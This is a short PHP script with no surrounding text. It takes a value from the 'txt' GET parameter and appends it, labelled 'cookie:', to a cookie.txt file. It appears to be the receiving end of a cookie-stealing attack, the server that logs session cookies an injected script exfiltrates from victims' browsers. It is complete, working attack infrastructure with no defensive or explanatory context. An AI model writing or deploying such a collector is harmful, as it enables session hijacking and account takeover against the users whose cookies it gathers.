<?php
$txt=$_GET['txt'];
$result="cookie:$txt\n";
$file=fopen('cookie.txt',"a");
fwrite($file,$result);
fclose($file);
?>